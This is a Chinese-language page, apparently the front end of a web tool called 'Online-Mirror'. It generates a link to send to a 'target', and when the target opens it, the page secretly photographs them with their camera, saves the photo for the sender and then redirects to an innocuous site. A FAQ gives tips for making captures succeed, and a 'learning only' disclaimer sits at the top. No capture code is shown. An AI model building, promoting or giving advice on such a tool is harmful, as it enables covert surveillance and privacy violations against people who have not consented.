# Online-Mirror

**1. 本工具仅做学习交流使用，请勿用于非法用途！后果自负！**  
**2. 懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人。**  
**3. 为节省服务器资源，不定期删除7天前的数据。**

#### 输入ID：
`<input type="text" id="myid" placeholder="输入您的ID"/>`

#### 拍摄后跳转到：
`<input type="text" id="url" value='http://baidu.com'/>`

<div style="display: flex; justify-content: space-between; flex-wrap: wrap; margin: 15px 0;">

</div>

**将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存：**  
`<a id="kd" style="pointer-events: none;">请先生成链接！</a>`

#### 复制链接按钮  
`<button id="copyBtn" style="display: none;" onclick="copyToClipboard();">复制链接</button>`

**常见问题：**  
- **问题一：为什么拍摄的是黑屏？**  
  答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接。

- **问题二：拍摄的照片不全？**  
  答：还没等跳转完成就关闭了页面，数据还没传输完成。
